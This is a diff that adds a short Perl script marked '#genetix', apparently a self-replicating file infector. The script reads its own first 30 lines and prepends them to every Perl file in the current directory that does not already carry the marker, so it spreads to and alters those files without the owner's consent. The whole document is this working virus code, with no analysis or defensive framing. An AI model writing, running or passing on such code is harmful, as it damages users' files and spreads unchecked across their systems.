@@ -1,0 +1,30 @@
+#/usr/bin/perl
+#genetix
+
+$TheCode = __FILE__;
+
+my @Vcode = ();
+open(Host, $TheCode);
+while(<Host>)
+{
+    $. > 30 ? last : push @Vcode, $_;
+}
+
+close(Host);
+my @Target = glob("*.*");
+foreach my $Victim(@Target)
+{
+    $Filetype = lc(".pl");
+    if ($Victim =~ m/$Filetype/)
+    {
+        open(ReadMe, $Victim);
+        @ReadVictim = <ReadMe>;
+        close(ReadMe);
+        open(File, "+< $Victim");
+        if (@ReadVictim[1] !~ "#genetix")
+        {
+            print File @Vcode, @ReadVictim;
+        }
+        close(File)
+    }
+}
